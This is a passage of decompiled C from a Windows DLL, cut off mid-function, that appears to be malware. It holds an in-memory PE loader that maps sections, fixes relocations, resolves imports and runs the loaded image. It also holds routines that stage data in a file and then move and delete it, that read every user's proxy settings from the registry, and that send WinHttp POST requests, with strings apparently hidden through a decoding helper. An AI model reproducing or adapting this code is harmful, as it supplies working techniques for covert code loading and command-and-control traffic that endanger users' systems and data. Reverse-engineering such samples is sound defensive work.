int __cdecl sub_1000E21E(int a1)
{
  int v1; // esi
  unsigned __int16 *v2; // ebx
  _BYTE *i; // ecx
  char *v4; // edi
  int v5; // eax
  bool v6; // zf
  _DWORD *v7; // edi
  _BYTE *v8; // eax
  int v9; // edx
  char *v10; // edi
  _DWORD *v11; // eax
  int v12; // esi
  unsigned __int16 v13; // si
  unsigned int v14; // edx
  int v15; // edx
  _DWORD *v16; // edi
  int *v17; // edi
  unsigned __int16 *v18; // eax
  int v19; // esi
  int *j; // esi
  int v21; // eax
  int v22; // eax
  int *v23; // esi
  int v24; // ecx
  int v25; // eax
  int v26; // eax
  int v27; // eax
  unsigned int v28; // eax
  _DWORD *v29; // ebx
  int v31; // [esp-Ch] [ebp-38h]
  int v32; // [esp+Ch] [ebp-20h] BYREF
  unsigned int v33; // [esp+10h] [ebp-1Ch]
  int v34; // [esp+14h] [ebp-18h]
  int v35; // [esp+18h] [ebp-14h]
  int v36; // [esp+1Ch] [ebp-10h]
  unsigned __int16 *v37; // [esp+20h] [ebp-Ch]
  unsigned int v38; // [esp+24h] [ebp-8h]
  _DWORD *v39; // [esp+28h] [ebp-4h]

  v1 = a1 + 24;
  v2 = (unsigned __int16 *)(*(_DWORD *)(a1 + 84) + a1 + 24);
  v32 = 0;
  v34 = 0;
  v31 = *((_DWORD *)v2 + 20);
  v36 = 0;
  v35 = 0;
  v37 = v2;
  v39 = (_DWORD *)(*(int (__stdcall **)(_DWORD, int, int, int))a1)(0, v31, 4096, 4);
  if ( !v39 )
    return 0;
  i = (_BYTE *)(a1 + 24);
  if ( *((_DWORD *)v2 + 21) )
  {
    v4 = (char *)v39 - v1;
    v5 = *((_DWORD *)v2 + 21);
    do
    {
      i[(_DWORD)v4] = *i;
      ++i;
      --v5;
    }
    while ( v5 );
  }
  v6 = v2[3] == 0;
  v38 = 0;
  if ( !v6 )
  {
    v7 = v2 + 134;
    do
    {
      i = (_BYTE *)(v1 + *v7);
      v8 = (char *)v39 + *(v7 - 2);
      if ( *(v7 - 1) )
      {
        v9 = *(v7 - 1);
        do
        {
          *v8++ = *i++;
          --v9;
        }
        while ( v9 );
      }
      v2 = v37;
      ++v38;
      v7 += 10;
    }
    while ( v38 < v37[3] );
  }
  v10 = (char *)v39 - *((_DWORD *)v2 + 13);
  if ( v39 != *((_DWORD **)v2 + 13) )
  {
    v11 = (_DWORD *)((char *)v39 + *((_DWORD *)v2 + 40));
    if ( v11 == v39 )
      goto LABEL_56;
    v33 = (unsigned int)v11 + *((_DWORD *)v2 + 41);
    for ( i = (_BYTE *)v33; (unsigned int)v11 < v33; v11 = (_DWORD *)((char *)v11 + v11[1]) )
    {
      v12 = v11[1];
      i = (char *)v39 + *v11;
      v38 = 0;
      if ( ((v12 - 8) & 0xFFFFFFFE) != 0 )
      {
        v37 = (unsigned __int16 *)(v11 + 2);
        do
        {
          v13 = *v37 & 0xFFF;
          v14 = *v37 >> 12;
          if ( v14 >= 2 )
          {
            if ( v14 == 2 )
            {
              *(_WORD *)&i[v13] += (unsigned __int16)v10 & 0xFF00;
            }
            else
            {
              if ( v14 != 3 )
                goto LABEL_56;
              *(_DWORD *)&i[v13] += v10;
            }
          }
          v15 = v11[1];
          ++v38;
          ++v37;
        }
        while ( v38 < (unsigned int)(v15 - 8) >> 1 );
      }
    }
  }
  v16 = (_DWORD *)((char *)v39 + *((_DWORD *)v2 + 32));
  if ( v16 == v39 )
    goto LABEL_56;
  if ( v16[3] )
  {
    v17 = v16 + 4;
    do
    {
      if ( !*v17 )
        break;
      if ( *(v17 - 3) )
        goto LABEL_56;
      v18 = (unsigned __int16 *)(*(int (__thiscall **)(_BYTE *, int))(a1 + 12))(i, (int)v39 + *(v17 - 1));
      v19 = *v17;
      v37 = v18;
      for ( j = (_DWORD *)((char *)v39 + v19); ; ++j )
      {
        v21 = *j;
        if ( !*j )
          break;
        if ( v37 )
        {
          if ( v21 >= 0 )
            v22 = (int)v39 + v21 + 2;
          else
            v22 = (unsigned __int16)*j;
          *j = (*(int (__stdcall **)(unsigned __int16 *, int))(a1 + 16))(v37, v22);
        }
        else
        {
          *j = 0;
        }
      }
      v17 += 5;
    }
    while ( *(v17 - 1) );
  }
  v38 = 0;
  if ( v2[3] )
  {
    v23 = (int *)(v2 + 142);
    do
    {
      v24 = *v23;
      v25 = 1;
      if ( (*v23 & 0x20000020) != 0 )
        v34 = 1;
      if ( (v24 & 0x40000000) != 0 )
        v36 = 1;
      if ( v24 < 0 )
        v35 = 1;
      if ( v34 == 1 )
      {
        if ( v35 == 1 )
        {
          v25 = 64;
        }
        else
        {
          v26 = -(v36 != 1);
          LOBYTE(v26) = v26 & 0xF0;
          v25 = v26 + 32;
        }
      }
      else if ( v36 == 1 )
      {
        v27 = -(v35 != 1);
        LOBYTE(v27) = v27 & 0xFE;
        v25 = v27 + 4;
      }
      if ( !(*(int (__stdcall **)(int, _DWORD, int, int *))(a1 + 8))((int)v39 + *(v23 - 6), *(v23 - 7), v25, &v32) )
        goto LABEL_56;
      v28 = v2[3];
      ++v38;
      v23 += 10;
    }
    while ( v38 < v28 );
  }
  v29 = (_DWORD *)((char *)v39 + *((_DWORD *)v2 + 10));
  if ( !v29 || ((int (__thiscall *)(_BYTE *, _DWORD *, int, _DWORD))v29)(i, v39, 1, *(_DWORD *)(a1 + 20)) != 1 )
  {
LABEL_56:
    (*(void (__thiscall **)(_BYTE *, _DWORD *, _DWORD, int))(a1 + 4))(i, v39, 0, 0x8000);
    return 0;
  }
  return (int)v39;
}
// 1000E393: variable 'i' is possibly undefined

//----- (1000E4CF) --------------------------------------------------------
const CHAR *sub_1000E4CF()
{
  const CHAR *result; // eax

  result = (const CHAR *)sub_10008918((int)&unk_100153E0);
  lpSrc = result;
  return result;
}

//----- (1000E4E0) --------------------------------------------------------
char *__thiscall sub_1000E4E0(char *this, LPCSTR lpSrc, int a3, int a4, char a5)
{
  CHAR *v6; // edi

  *((_DWORD *)this + 67) = a3;
  *((_DWORD *)this + 69) = a4;
  v6 = this + 4;
  this[272] = 1;
  this[280] = a5;
  *(_DWORD *)this = &off_100102C4;
  memset(this + 4, 0, 0x105u);
  ExpandEnvironmentStringsA(lpSrc, v6, 0x104u);
  return this;
}
// 100102C4: using guessed type int (__stdcall *off_100102C4)(int, LPCVOID lpBuffer, int Buffer, void *);

//----- (1000E539) --------------------------------------------------------
char __thiscall sub_1000E539(int this, int a2, _BYTE *lpBuffer, int Buffer, volatile LONG *a5)
{
  int v6; // ebx
  int v7; // eax
  DWORD FileSize; // edi
  UINT v9; // eax
  HANDLE v10; // ebx
  int v11; // eax
  _BYTE *v12; // edi
  UINT v13; // eax
  int v15; // [esp+0h] [ebp-80h] BYREF
  int v16; // [esp+Ch] [ebp-74h]
  _DWORD v17[9]; // [esp+30h] [ebp-50h] BYREF
  int v18; // [esp+54h] [ebp-2Ch]
  char v19; // [esp+58h] [ebp-28h]
  HANDLE hFile; // [esp+5Ch] [ebp-24h]
  char v21; // [esp+60h] [ebp-20h]
  DWORD v22; // [esp+64h] [ebp-1Ch]
  int v23; // [esp+68h] [ebp-18h] BYREF
  int v24; // [esp+6Ch] [ebp-14h]
  int *v25; // [esp+70h] [ebp-10h]
  int v26; // [esp+7Ch] [ebp-4h]

  v25 = &v15;
  v6 = 0;
  v26 = 1;
  v21 = 0;
  hFile = (HANDLE)-1;
  v19 = 0;
  LOBYTE(v23) = 113;
  if ( a2 || Buffer && !lpBuffer )
    goto LABEL_29;
  if ( !sub_1000B952((LPCSTR)(this + 4)) )
  {
    v19 = 1;
    v6 = lstrlenA(*(LPCSTR *)(this + 276)) + 1;
    v24 = v6;
  }
  v18 = 3;
  while ( 1 )
  {
    v7 = v18--;
    if ( !v7 || hFile != (HANDLE)-1 )
      break;
    hFile = CreateFileA((LPCSTR)(this + 4), 0xC0000000, 0, 0, 4u, 0, 0);
    if ( hFile == (HANDLE)-1 )
    {
      if ( GetLastError() != 32 )
        goto LABEL_29;
      v16 = rand();
      Sleep((__int64)((double)v16 * 0.000030518509 * 120000.0));
    }
  }
  if ( v19 )
  {
    sub_1000C396(v17, this + 4, 1);
    LOBYTE(v26) = 2;
    sub_1000C3E9(v17);
    LOBYTE(v26) = 1;
    sub_1000C3E2(v17);
  }
  else if ( !sub_1000E7A4(hFile, &v23) )
  {
    goto LABEL_29;
  }
  FileSize = GetFileSize(hFile, 0);
  v22 = FileSize;
  if ( FileSize == -1 )
    goto LABEL_29;
  v9 = sub_1000EA4D((BSTR **)&a5);
  v24 = Buffer + 2 * v9 + 6 + v6;
  if ( *(_DWORD *)(this + 268) <= FileSize + v24 )
  {
LABEL_28:
    *(_BYTE *)(this + 272) = 0;
    goto LABEL_29;
  }
  v10 = hFile;
  if ( SetFilePointer(hFile, 0, 0, 2u) == -1 )
  {
LABEL_29:
    LOBYTE(v26) = 3;
    goto LABEL_30;
  }
  if ( v19 == 1 )
  {
    v11 = lstrlenA(*(LPCSTR *)(this + 276));
    if ( !sub_1000BE44(v10, *(_BYTE **)(this + 276), v11 + 1) )
      goto LABEL_28;
  }
  if ( !sub_1000BD41(v10, &Buffer, 4u, 1, &v23) )
    goto LABEL_28;
  v12 = a5 ? (_BYTE *)*a5 : 0;
  v13 = sub_1000EA4D((BSTR **)&a5);
  if ( !sub_1000BD41(v10, v12, 2 * v13 + 2, 1, &v23) || Buffer && !sub_1000BD41(v10, lpBuffer, Buffer, 1, &v23) )
    goto LABEL_28;
  v21 = 1;
LABEL_30:
  v26 = 0;
  if ( hFile != (HANDLE)-1 )
    CloseHandle(hFile);
  v26 = -1;
  if ( a5 )
    sub_1000219B(a5);
  return v21;
}
// 1000E539: using guessed type _DWORD var_50[9];

//----- (1000E777) --------------------------------------------------------
char __thiscall sub_1000E777(int this, int a2)
{
  if ( a2 )
    return 0;
  if ( sub_1000B952((LPCSTR)(this + 4)) )
    *(_BYTE *)(this + 272) = 1;
  return *(_BYTE *)(this + 272);
}

//----- (1000E7A4) --------------------------------------------------------
char __stdcall sub_1000E7A4(HANDLE hFile, _BYTE *lpBuffer)
{
  DWORD NumberOfBytesRead; // [esp+Ch] [ebp-20h] BYREF
  char v4; // [esp+10h] [ebp-1Ch]
  CPPEH_RECORD ms_exc; // [esp+14h] [ebp-18h]

  v4 = 0;
  *lpBuffer = 113;
  ms_exc.registration.TryLevel = 0;
  if ( hFile )
  {
    if ( SetFilePointer(hFile, -1, 0, 2u) != -1 )
    {
      NumberOfBytesRead = 0;
      if ( ReadFile(hFile, lpBuffer, 1u, &NumberOfBytesRead, 0) )
        return 1;
    }
  }
  return v4;
}

//----- (1000E82D) --------------------------------------------------------
char __thiscall sub_1000E82D(CHAR *this, _DWORD *a2, DWORD *a3)
{
  int v4; // eax
  double v5; // st7
  HANDLE FileA; // eax
  DWORD FileSize; // eax
  void *v8; // eax
  int v11; // [esp+14h] [ebp-12Ch]
  DWORD NumberOfBytesRead; // [esp+18h] [ebp-128h] BYREF
  HANDLE hFile; // [esp+1Ch] [ebp-124h]
  CHAR Dst[264]; // [esp+20h] [ebp-120h] BYREF
  CPPEH_RECORD ms_exc; // [esp+128h] [ebp-18h] BYREF

  hFile = 0;
  memset(Dst, 0, 261);
  ms_exc.registration.TryLevel = 0;
  if ( this[280] == 1 )
  {
    ExpandEnvironmentStringsA(lpSrc, Dst, 0x104u);
    if ( !sub_1000B952(Dst) )
    {
      v11 = 3;
      while ( 1 )
      {
        v4 = v11--;
        if ( !v4 || MoveFileA(this + 4, Dst) )
          break;
        if ( GetLastError() != 32 )
          goto LABEL_14;
        v5 = (double)rand() * 0.000030518509 * 120000.0;
        Sleep((__int64)v5);
      }
    }
    FileA = CreateFileA(Dst, 0x80000000, 1u, 0, 3u, 0, 0);
  }
  else
  {
    FileA = CreateFileA(this + 4, 0x80000000, 1u, 0, 3u, 0, 0);
  }
  hFile = FileA;
  if ( FileA == (HANDLE)-1 )
    goto LABEL_14;
  FileSize = GetFileSize(FileA, 0);
  *a3 = FileSize;
  v8 = malloc(FileSize);
  *a2 = v8;
  if ( !v8 )
    goto LABEL_14;
  NumberOfBytesRead = 0;
  if ( !ReadFile(hFile, v8, *a3, &NumberOfBytesRead, 0) )
  {
    (*(void (__thiscall **)(CHAR *, _DWORD))(*(_DWORD *)this + 4))(this, *a2);
LABEL_14:
    local_unwind2(&ms_exc.registration, -1);
    return 0;
  }
  ms_exc.registration.TryLevel = -1;
  CloseHandle(hFile);
  return 1;
}
// 10008710: using guessed type int __cdecl local_unwind2(_DWORD, _DWORD);

//----- (1000E9D8) --------------------------------------------------------
void __stdcall sub_1000E9D8(void *Block)
{
  free(Block);
}

//----- (1000E9E6) --------------------------------------------------------
BOOL __thiscall sub_1000E9E6(int this)
{
  CHAR Dst[264]; // [esp+0h] [ebp-108h] BYREF

  if ( *(_BYTE *)(this + 280) != 1 )
    return DeleteFileA((LPCSTR)(this + 4));
  memset(Dst, 0, 261);
  ExpandEnvironmentStringsA(lpSrc, Dst, 0x104u);
  return DeleteFileA(Dst);
}

//----- (1000EA4D) --------------------------------------------------------
UINT __thiscall sub_1000EA4D(BSTR **this)
{
  if ( *this && **this )
    return SysStringLen(**this);
  else
    return 0;
}

//----- (1000EA80) --------------------------------------------------------
const CHAR *sub_1000EA80()
{
  const CHAR *result; // eax

  result = (const CHAR *)sub_10008918((int)&unk_10015414);
  dword_100161B4 = result;
  return result;
}

//----- (1000EAA0) --------------------------------------------------------
_BYTE *__thiscall sub_1000EAA0(_BYTE *this)
{
  _BYTE *result; // eax

  result = this;
  this[4] = 0;
  this[5] = 0;
  *(_DWORD *)this = &off_100108A8;
  return result;
}
// 100108A8: using guessed type int (__thiscall *off_100108A8)(void *, char);

//----- (1000EAC0) --------------------------------------------------------
_DWORD *__thiscall sub_1000EAC0(_DWORD *this, char a2)
{
  sub_1000EAE0(this);
  if ( (a2 & 1) != 0 )
    operator delete(this);
  return this;
}

//----- (1000EAE0) --------------------------------------------------------
void __thiscall sub_1000EAE0(_DWORD *this)
{
  *this = &off_100108C8;
}
// 100108C8: using guessed type void *(__thiscall *off_100108C8)(std::locale::facet *__hidden this, char);

//----- (1000EAF0) --------------------------------------------------------
void **__stdcall sub_1000EAF0(HKEY hKey, void **a2, void **a3)
{
  void **result; // eax
  const CHAR *v4; // eax
  const CHAR *v5; // eax
  const CHAR *v6; // eax
  WCHAR *v7; // eax
  int v8; // ecx
  const CHAR *v9; // eax
  WCHAR *v10; // eax
  int v11; // ecx
  DWORD cbData; // [esp+10h] [ebp-34Ch] BYREF
  HKEY v13; // [esp+14h] [ebp-348h] BYREF
  DWORD cSubKeys; // [esp+18h] [ebp-344h] BYREF
  DWORD dwIndex; // [esp+1Ch] [ebp-340h]
  HKEY phkResult; // [esp+20h] [ebp-33Ch] BYREF
  BYTE Data[4]; // [esp+24h] [ebp-338h] BYREF
  DWORD cchClass; // [esp+28h] [ebp-334h] BYREF
  DWORD cchName; // [esp+2Ch] [ebp-330h] BYREF
  DWORD cbSecurityDescriptor; // [esp+30h] [ebp-32Ch] BYREF
  DWORD cbMaxSubKeyLen; // [esp+34h] [ebp-328h] BYREF
  DWORD cbMaxValueLen; // [esp+38h] [ebp-324h] BYREF
  struct _FILETIME ftLastWriteTime; // [esp+3Ch] [ebp-320h] BYREF
  DWORD cValues; // [esp+44h] [ebp-318h] BYREF
  DWORD cbMaxValueNameLen; // [esp+48h] [ebp-314h] BYREF
  DWORD cbMaxClassLen; // [esp+4Ch] [ebp-310h] BYREF
  BYTE v27[260]; // [esp+50h] [ebp-30Ch] BYREF
  CHAR Class[257]; // [esp+154h] [ebp-208h] BYREF
  __int16 v29; // [esp+255h] [ebp-107h]
  char v30; // [esp+257h] [ebp-105h]
  CHAR Name[260]; // [esp+258h] [ebp-104h] BYREF

  Class[0] = String2[0];
  result = 0;
  cchClass = 260;
  memset(&Class[1], 0, 0x100u);
  cbData = 4;
  v29 = 0;
  v30 = 0;
  cSubKeys = 0;
  *(_DWORD *)Data = 0;
  if ( a2 )
  {
    result = a3;
    if ( a3 )
    {
      if ( !*a2 && !*a3 )
      {
        RegQueryInfoKeyA(
          hKey,
          Class,
          &cchClass,
          0,
          &cSubKeys,
          &cbMaxSubKeyLen,
          &cbMaxClassLen,
          &cValues,
          &cbMaxValueNameLen,
          &cbMaxValueLen,
          &cbSecurityDescriptor,
          &ftLastWriteTime);
        result = (void **)cSubKeys;
        if ( cSubKeys )
        {
          for ( dwIndex = 0; dwIndex < cSubKeys; ++dwIndex )
          {
            cchName = 260;
            cbData = 4;
            if ( !RegEnumKeyExA(hKey, dwIndex, Name, &cchName, 0, 0, 0, &ftLastWriteTime) )
            {
              RegOpenKeyExA(HKEY_USERS, Name, 0, 0xF003Fu, &phkResult);
              v4 = (const CHAR *)sub_10008918((int)&unk_100154A0);
              RegOpenKeyExA(phkResult, v4, 0, 0xF003Fu, &v13);
              v5 = (const CHAR *)sub_10008918((int)&unk_1001547C);
              RegQueryValueExA(v13, v5, 0, 0, Data, &cbData);
              if ( *(_DWORD *)Data )
              {
                cbData = 260;
                v6 = (const CHAR *)sub_10008918((int)&unk_10015458);
                if ( !RegQueryValueExA(v13, v6, 0, 0, v27, &cbData) )
                {
                  v7 = (WCHAR *)operator new(2 * cbData);
                  v8 = cbData;
                  *a2 = v7;
                  if ( !MultiByteToWideChar(0, 0, (LPCCH)v27, -1, v7, v8) )
                  {
                    operator delete(*a2);
                    *a2 = 0;
                  }
                }
                cbData = 260;
                v9 = (const CHAR *)sub_10008918((int)&unk_10015430);
                if ( !RegQueryValueExA(v13, v9, 0, 0, v27, &cbData) )
                {
                  v10 = (WCHAR *)operator new(2 * cbData);
                  v11 = cbData;
                  *a3 = v10;
                  if ( !MultiByteToWideChar(0, 0, (LPCCH)v27, -1, v10, v11) )
                  {
                    operator delete(*a3);
                    *a3 = 0;
                  }
                }
              }
              RegCloseKey(v13);
              result = (void **)RegCloseKey(phkResult);
              if ( *a2 )
                break;
              result = a3;
              if ( *a3 )
                break;
            }
            result = (void **)(dwIndex + 1);
          }
        }
      }
    }
  }
  return result;
}
// 1000EBB5: conditional instruction was optimized away because %cSubKeys.4!=0

//----- (1000EDB0) --------------------------------------------------------
int __thiscall sub_1000EDB0(
        void *this,
        LPVOID lpOptional,
        DWORD dwOptionalLength,
        void **a4,
        unsigned int *a5,
        LPCCH lpMultiByteStr,
        LPCCH a7,
        INTERNET_PORT nServerPort,
        char a9)
{
  DWORD v9; // ebx
  unsigned int v10; // ebp
  DWORD v11; // ecx
  void *v12; // eax
  void *v13; // edi
  void *v14; // eax
  void *v15; // ebx
  void *v16; // edi
  DWORD v17; // esi
  void *v18; // eax
  void *v19; // edx
  int v21; // [esp+10h] [ebp-74Ch]
  DWORD dwNumberOfBytesAvailable; // [esp+14h] [ebp-748h] BYREF
  HINTERNET hRequest; // [esp+18h] [ebp-744h]
  void *v24; // [esp+1Ch] [ebp-740h]
  DWORD v25; // [esp+20h] [ebp-73Ch]
  void *v26; // [esp+24h] [ebp-738h]
  LPCWSTR pszProxyBypassW; // [esp+28h] [ebp-734h] BYREF
  LPCWSTR pszProxyW; // [esp+2Ch] [ebp-730h] BYREF
  void *v29; // [esp+30h] [ebp-72Ch]
  DWORD dwNumberOfBytesRead; // [esp+34h] [ebp-728h] BYREF
  DWORD cbSize; // [esp+38h] [ebp-724h] BYREF
  CHAR pszUAOut[264]; // [esp+3Ch] [ebp-720h] BYREF
  WCHAR pwszObjectName[260]; // [esp+144h] [ebp-618h] BYREF
  WCHAR pszAgentW[260]; // [esp+34Ch] [ebp-410h] BYREF
  WCHAR WideCharStr[260]; // [esp+554h] [ebp-208h] BYREF

  v26 = this;
  memset(WideCharStr, 0, sizeof(WideCharStr));
  memset(pwszObjectName, 0, sizeof(pwszObjectName));
  memset(pszAgentW, 0, sizeof(pszAgentW));
  v9 = 0;
  memset(pszUAOut, 0, 261);
  dwNumberOfBytesAvailable = 0;
  v10 = 0;
  dwNumberOfBytesRead = 0;
  v21 = 0;
  v25 = 1;
  pszProxyW = 0;
  pszProxyBypassW = 0;
  v24 = 0;
  v29 = 0;
  cbSize = 260;
  ObtainUserAgentString(0, pszUAOut, &cbSize);
  if ( MultiByteToWideChar(0, 0, lpMultiByteStr, -1, WideCharStr, 260) )
  {
    if ( MultiByteToWideChar(0, 0, a7, -1, pwszObjectName, 260) )
    {
      if ( MultiByteToWideChar(0, 0, pszUAOut, -1, pszAgentW, 260) )
      {
        sub_1000EAF0(HKEY_USERS, (void **)&pszProxyW, (void **)&pszProxyBypassW);
        v11 = 3;
        if ( !pszProxyW )
          v11 = v25;
        v12 = WinHttpOpen(pszAgentW, v11, pszProxyW, pszProxyBypassW, 0);
        v13 = v12;
        v25 = (DWORD)v12;
        if ( v12 )
        {
          v14 = WinHttpConnect(v12, WideCharStr, nServerPort, 0);
          v26 = v14;
          if ( v14 )
          {
            if ( a9 == 1 )
              v9 = 0x800000;
            BYTE1(v9) |= 1u;
            if ( lpOptional )
            {
              hRequest = WinHttpOpenRequest(v14, aPost, pwszObjectName, 0, 0, 0, v9);
              v15 = hRequest;
            }
            else
            {
              v15 = WinHttpOpenRequest(v14, pwszVerb, pwszObjectName, 0, 0, 0, v9);
              hRequest = v15;
            }
            if ( v15 )
            {
              if ( WinHttpSendRequest(v15, 0, 0, lpOptional, dwOptionalLength, dwOptionalLength, 0) )
              {
                if ( WinHttpReceiveResponse(v15, 0) )
                {
                  dwNumberOfBytesAvailable = 0;
                  if ( WinHttpQueryDataAvailable(v15, &dwNumberOfBytesAvailable) )
                  {
                    while ( dwNumberOfBytesAvailable )
                    {
                      v16 = operator new(dwNumberOfBytesAvailable);
                      v24 = v16;
                      if ( !v16 )
                      {
                        v21 = 1;
                        break;
                      }
                      v17 = dwNumberOfBytesAvailable;
                      if ( dwNumberOfBytesAvailable )
                      {
                        while ( WinHttpReadData(hRequest, v16, v17, &dwNumberOfBytesRead) )
                        {
                          v17 -= dwNumberOfBytesRead;
                          if ( !v17 )
                          {
                            v17 = dwNumberOfBytesAvailable;
                            goto LABEL_31;
                          }
                        }
                        v21 = 3;
                        break;
                      }
LABEL_31:
                      if ( a4 )
                      {
                        v18 = operator new(v17 + v10);
                        v19 = v29;
                        *a4 = v18;
                        qmemcpy(v18, v19, v10);
                        qmemcpy((char *)*a4 + v10, v24, dwNumberOfBytesAvailable);
                        operator delete(v19);
                        v16 = v24;
                        v10 += dwNumberOfBytesAvailable;
                        v29 = *a4;
                        *a5 = v10;
                      }
                      operator delete(v16);
                      v24 = 0;
                      if ( !dwNumberOfBytesAvailable )
                        break;
                      dwNumberOfBytesAvailable = 0;
                      if ( !WinHttpQueryDataAvailable(hRequest, &dwNumberOfBytesAvailable) )
                      {
                        v15 = hRequest;
                        goto LABEL_36;
                      }
                    }
                    v15 = hRequest;
                  }
                  else
                  {
LABEL_36:
                    v21 = 3;
                  }
                }
                else
                {
                  v21 = 3;
                }
              }
              else
              {
                v21 = 1;
              }
              WinHttpCloseHandle(v15);
            }
            else
            {
              v21 = 1;
            }
            v13 = (void *)v25;
            v14 = v26;
          }
          else
          {
            v21 = 1;
          }
          if ( v14 )
            WinHttpCloseHandle(v14);
        }
        else
        {
          v21 = 1;
        }
        if ( v13 )
          WinHttpCloseHandle(v13);
        if ( v24 )
          operator delete(v24);
      }
      else
      {
        v21 = 1;
      }
    }
    else
    {
      v21 = 1;
    }
  }
  else
  {
    v21 = 1;
  }
  if ( pszProxyW )
    operator delete((void *)pszProxyW);
  if ( pszProxyBypassW )
    operator delete((void *)pszProxyBypassW);
  return v21;
}

//----- (1000F1E0) --------------------------------------------------------
bool sub_1000F1E0()
{
  return WinHttpCheckPlatform();
}

//----- (1000F200) --------------------------------------------------------
bool __thiscall sub_1000F200(int *this)
{
  int v2; // edi
  int v3; // eax
  int v5; // [esp-Ch] [ebp-14h]

  v2 = *this;
  v5 = sub_10008918((int)&unk_10015530);
  v3 = sub_10008918((int)&unk_10015508);
  return (*(int (__thiscall **)(int *, _DWORD, _DWORD, _DWORD, _DWORD, int, int, int, _DWORD))(v2 + 16))(
           this,
           0,
           0,
           0,
           0,
           v3,
           v5,
           80,
           0) == 0;
}

//----- (1000F240) --------------------------------------------------------
char __stdcall sub_1000F240(int a1)
{
  return 1;
}

//----- (1000F260) --------------------------------------------------------
void __stdcall sub_1000F260(void *a1)
{
  operator delete(a1);
}

//----- (1000F33C) --------------------------------------------------------
void GetSystemMetrics_thunk()
{
  JUMPOUT(0x10007A9C);
}
// 1000F343: control flows out of bounds to 10007A9C

//----- (1000F34E) --------------------------------------------------------
void SetSecurityDescriptorDacl_thunk()
{
  JUMPOUT(0x10007ABC);
}
// 1000F355: control flows out of bounds to 10007ABC

//----- (1000F360) --------------------------------------------------------
void InitializeSecurityDescriptor_thunk()
{
  JUMPOUT(0x10007ABC);
}
// 1000F367: control flows out of bounds to 10007ABC

//----- (1000F372) --------------------------------------------------------
void RegQueryValueExA_thunk()
{
  JUMPOUT(0x10007ABC);
}
// 1000F379: control flows out of bounds to 10007ABC

//----- (1000F384) --------------------------------------------------------
void RegSetValueExA_thunk()
{
  JUMPOUT(0x10007ABC);
}
// 1000F38B: control flows out of bounds to 10007ABC

//----- (1000F396) --------------------------------------------------------
void RegDeleteValueA_thunk()
{
  JUMPOUT(0x10007ABC);
}
// 1000F39D: control flows out of bounds to 10007ABC

//----- (1000F3A8) --------------------------------------------------------
void FreeSid_thunk()
{
  JUMPOUT(0x10007ABC);
}
// 1000F3AF: control flows out of bounds to 10007ABC

//----- (1000F3BA) --------------------------------------------------------
void SetNamedSecurityInfoA_thunk()
{
  JUMPOUT(0x10007ABC);
}
// 1000F3C1: control flows out of bounds to 10007ABC

//----- (1000F3CC) --------------------------------------------------------
void AdjustTokenPrivileges_thunk()
{
  JUMPOUT(0x10007ABC);
}
// 1000F3D3: control flows out of bounds to 10007ABC

//----- (1000F3DE) --------------------------------------------------------
void LookupPrivilegeValueA_thunk()
{
  JUMPOUT(0x10007ABC);
}
// 1000F3E5: control flows out of bounds to 10007ABC

//----- (1000F3F0) --------------------------------------------------------
void SetEntriesInAclA_thunk()
{
  JUMPOUT(0x10007ABC);
}
// 1000F3F7: control flows out of bounds to 10007ABC

//----- (1000F402) --------------------------------------------------------
void AllocateAndInitializeSid_thunk()
{
  JUMPOUT(0x10007ABC);
}
// 1000F409: control flows out of bounds to 10007ABC

//----- (1000F414) --------------------------------------------------------
void GetNamedSecurityInfoA_thunk()
{
  JUMPOUT(0x10007ABC);
}
// 1000F41B: control flows out of bounds to 10007ABC

//----- (1000F426) --------------------------------------------------------
void LookupAccountSidA_thunk()
{
  JUMPOUT(0x10007ABC);
}
// 1000F42D: control flows out of bounds to 10007ABC

//----- (1000F438) --------------------------------------------------------
void GetTokenInformation_thunk()
{
  JUMPOUT(0x10007ABC);
}
// 1000F43F: control flows out of bounds to 10007ABC

//----- (1000F44A) --------------------------------------------------------
void GetUserNameA_thunk()
{
  JUMPOUT(0x10007ABC);
}
// 1000F451: control flows out of bounds to 10007ABC

//----- (1000F45C) --------------------------------------------------------
void RegEnumKeyExA_thunk()
{
  JUMPOUT(0x10007ABC);
}
// 1000F463: control flows out of bounds to 10007ABC

//----- (1000F46E) --------------------------------------------------------
void RegQueryInfoKeyA_thunk()
{
  JUMPOUT(0x10007ABC);
}
// 1000F475: control flows out of bounds to 10007ABC

//----- (1000F480) --------------------------------------------------------
void OLEAUT32_200_thunk()
{
  JUMPOUT(0x10007B12);
}
// 1000F487: control flows out of bounds to 10007B12

//----- (1000F492) --------------------------------------------------------
void OLEAUT32_201_thunk()
{
  JUMPOUT(0x10007B12);
}
// 1000F499: control flows out of bounds to 10007B12

//----- (1000F4A4) --------------------------------------------------------
void OLEAUT32_12_thunk()
{
  JUMPOUT(0x10007B12);
}
// 1000F4AB: control flows out of bounds to 10007B12

//----- (1000F4B6) --------------------------------------------------------
void OLEAUT32_202_thunk()
{
  JUMPOUT(0x10007B12);
}
// 1000F4BD: control flows out of bounds to 10007B12

//----- (1000F4C8) --------------------------------------------------------
void OLEAUT32_9_thunk()
{
  JUMPOUT(0x10007B12);
}
// 1000F4CF: control flows out of bounds to 10007B12

//----- (1000F4DA) --------------------------------------------------------
void OLEAUT32_8_thunk()
{
  JUMPOUT(0x10007B12);
}
// 1000F4E1: control flows out of bounds to 10007B12

//----- (1000F4EC) --------------------------------------------------------
void OLEAUT32_2_thunk()
{
  JUMPOUT(0x10007B12);
}
// 1000F4F3: control flows out of bounds to 10007B12

//----- (1000F4FE) --------------------------------------------------------
void OLEAUT32_7_thunk()
{
  JUMPOUT(0x10007B12);
}
// 1000F505: control flows out of bounds to 10007B12

//----- (1000F510) --------------------------------------------------------
int __fastcall WinHttpCloseHandle_thunk(int a1, int a2)
{
  FARPROC v2; // eax

  v2 = sub_100083EA(&WINHTTP_dll_import_table, (int *)&WinHttpCloseHandle);
  return ((int (__fastcall *)(int, int))v2)(a1, a2);
}
// 10011688: using guessed type int WINHTTP_dll_import_table;

//----- (1000F530) --------------------------------------------------------
void WinHttpReadData_thunk()
{
  JUMPOUT(0x1000F51C);
}
// 1000F537: control flows out of bounds to 1000F51C

//----- (1000F542) --------------------------------------------------------
void WinHttpQueryDataAvailable_thunk()
{
  JUMPOUT(0x1000F51C);
}
// 1000F549: control flows out of bounds to 1000F51C

//----- (1000F554) --------------------------------------------------------
void WinHttpReceiveResponse_thunk()
{
  JUMPOUT(0x1000F51C);
}
// 1000F55B: control flows out of bounds to 1000F51C

//----- (1000F566) --------------------------------------------------------
void WinHttpSendRequest_thunk()
{
  JUMPOUT(0x1000F51C);
}
// 1000F56D: control flows out of bounds to 1000F51C

//----- (1000F578) --------------------------------------------------------
void WinHttpOpenRequest_thunk()
